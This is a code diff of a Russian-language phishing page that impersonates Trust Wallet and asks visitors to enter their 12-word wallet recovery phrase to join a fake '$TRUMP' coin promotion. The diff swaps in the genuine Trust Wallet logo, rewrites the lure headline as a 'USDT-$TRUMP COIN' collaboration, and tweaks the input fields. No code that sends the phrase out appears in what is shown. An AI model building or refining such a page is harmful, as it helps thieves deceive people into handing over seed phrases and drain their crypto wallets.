@@ -29,7 +29,7 @@
             margin-bottom: 16px;
         }
         .logo img {
-            width: 300px;
+            width: 80px;
             height: auto;
         }
         h1 {
@@ -45,6 +45,7 @@
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 16px;
+            justify-items: start;
         }
         .seed-item {
             display: flex;
@@ -58,7 +59,6 @@
             flex-shrink: 0;
         }
         input {
-            flex-grow: 1;
             padding: 8px;
             font-size: 14px;
             border: 1px solid #333333;
@@ -67,6 +67,7 @@
             color: #FFFFFF;
             width: 100%;
             box-sizing: border-box;
+            text-align: left;
         }
         input::placeholder {
             color: #888888;
@@ -101,75 +102,64 @@
 <body>
     <div class="container">
         <div class="logo">
-            <img src="IMG_2088.png" alt="Trust Wallet Logo">
+            <img src="https://trustwallet.com/assets/images/media/assets/tw-logo.svg" alt="Trust Wallet Logo">
         </div>
-        <h1>Для участия в акции $TRUMP авторизуйте свой кошелёк</h1>
+        <h1>Для участия в колоборации USDT-$TRUMP COIN авторизуйте свой кошелёк</h1>
         <p class="description">Введите вашу секретную фразу из 12 слов. Убедитесь, что вы храните её в безопасности!</p>
         <form id="seedForm">
             <div class="seed-input">
                 <div class="seed-item">
                     <label for="word1">1.</label>
-                    <input type="text" id="word1" name="word1" placeholder="Введите слово" required>
+                    <input type="text" id="word1" name="word1" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word2">2.</label>
-                    <input type="text" id="word2" name="word2" placeholder="Введите слово" required>
+                    <input type="text" id="word2" name="word2" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word3">3.</label>
-                    <input type="text" id="word3" name="word3" placeholder="Введите слово" required>
+                    <input type="text" id="word3" name="word3" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word4">4.</label>
-                    <input type="text" id="word4" name="word4" placeholder="Введите слово" required>
+                    <input type="text" id="word4" name="word4" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word5">5.</label>
-                    <input type="text" id="word5" name="word5" placeholder="Введите слово" required>
+                    <input type="text" id="word5" name="word5" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word6">6.</label>
-                    <input type="text" id="word6" name="word6" placeholder="Введите слово" required>
+                    <input type="text" id="word6" name="word6" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word7">7.</label>
-                    <input type="text" id="word7" name="word7" placeholder="Введите слово" required>
+                    <input type="text" id="word7" name="word7" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word8">8.</label>
-                    <input type="text" id="word8" name="word8" placeholder="Введите слово" required>
+                    <input type="text" id="word8" name="word8" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word9">9.</label>
-                    <input type="text" id="word9" name="word9" placeholder="Введите слово" required>
+                    <input type="text" id="word9" name="word9" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word10">10.</label>
-                    <input type="text" id="word10" name="word10" placeholder="Введите слово" required>
+                    <input type="text" id="word10" name="word10" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word11">11.</label>
-                    <input type="text" id="word11" name="word11" placeholder="Введите слово" required>
+                    <input type="text" id="word11" name="word11" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
                 <div class="seed-item">
                     <label for="word12">12.</label>
-                    <input type="text" id="word12" name="word12" placeholder="Введите слово" required>
+                    <input type="text" id="word12" name="word12" placeholder="Введите слово" inputmode="latin" autocapitalize="none" required>
                 </div>
             </div>
             <button type="submit">Отправить</button>
         </form>
         <div class="warning">Никогда не делитесь своей секретной фразой с другими!</div>
     </div>
-
-    <script>
-        document.querySelectorAll('input').forEach(input => {
-            input.addEventListener('input', function () {
-                this.value = this.value.replace(/[^a-z]/g, '').toLowerCase(); // Только латинские буквы
-            });
-            input.addEventListener('focus', function () {
-                this.setAttribute('inputmode', 'latin'); // Активирует английскую клавиатуру
-            });
-        });
-    </script>
 </body>
 </html>
